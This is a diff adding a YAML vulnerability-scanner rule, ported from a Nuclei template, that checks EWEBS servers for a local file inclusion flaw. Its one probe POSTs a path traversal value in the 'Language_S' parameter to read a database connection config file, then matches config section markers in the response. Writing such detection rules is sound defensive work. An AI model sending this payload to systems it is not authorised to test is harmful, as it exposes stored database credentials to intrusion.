@@ -1,0 +1,35 @@
+schema_version: 1
+id: "cortex.community:ewebs-arbitrary-file-reading"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "EWEBS - Local File Inclusion"
+  description: "EWEBS is vulnerable to local file inclusion and allows remote attackers to disclose the content of locally stored files via the 'Language_S' parameter supplied to the 'casmain.xgi' endpoint. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9E%81%E9%80%9AEWEBS/%E6%9E%81%E9%80%9AEWEBS%20casmain.xgi%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html"
+  cwes: [22]
+  tags: ["ewebs", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request:
+      method: "POST"
+      path: "/casmain.xgi"
+      headers: { "Content-Type": "application/x-www-form-urlencoded" }
+      body: "Language_S=../../Data/CONFIG/CasDbCnn.dat"
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "[Edition]" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "[LocalInfo]" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
